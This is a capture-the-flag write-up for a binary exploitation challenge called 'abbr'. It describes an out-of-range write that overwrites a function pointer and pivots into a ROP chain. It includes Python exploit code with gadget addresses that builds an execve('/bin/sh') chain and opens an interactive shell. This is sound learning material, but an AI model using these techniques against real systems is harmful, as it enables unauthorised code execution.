# ABBR

## TLDR
### Vulnerability
* out of range refference
* buffer overflow
### How to attack
* overwrite function pointer
* execute rop chain

## Challenge
### Description
result of file command
* Arch    : x86-64
* Library : Statically linked
* Symbol  : Not stripped

result of checksec
* RELRO  : Partial RELRO
* Canary : Enable
* NX     : Enable
* PIE    : Disable

### Exploit 
In english\_expand(), we can overwrite out of text area.  
The structure of Translator is just below the text. so we can control RIP value with overwriting "translate" member of structure.  


Next, What value we should overwrite with?  
There is great gadget, "xchg rax, rsp".  
When the translate member is execute as function, RAX is the address of text where we can freely write on.  
So we should prepare rop chain gadget there.  

A part of exploit
```python
xchg_eax_esp = 0x405121
rdi_ret = 0x4018da
rsi_ret = 0x404cfe
rax_ret = 0x45a8f7
rdx_ret = 0x4017df
mov_ptr_rdi_rsi_ret = 0x45684f
syscall = 0x4012e3

def exploit():
	
	payload = b"aaw"
	payload += b"A"*(0xfff-3-3)
	payload += b"\x21\x51\x40"
	conn.sendafter("text: ", payload) 
	
	payload = p64(rdi_ret)
	payload += p64(addr_bss)
	payload += p64(rsi_ret)
	payload += b"/bin/sh\x00"
	payload += p64(mov_ptr_rdi_rsi_ret)
	payload += p64(rsi_ret)
	payload += p64(0)
	payload += p64(rdx_ret)
	payload += p64(0)
	payload += p64(rax_ret)
	payload += p64(59)
	payload += p64(syscall)

	conn.sendlineafter("text: ", payload) 
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
```

My exploit code is [solve.py](https://github.com/kam1tsur3/2021_CTF/blob/master/asis/pwn/abbr.d/solve.py).

## Reference

twitter: @kam1tsur3
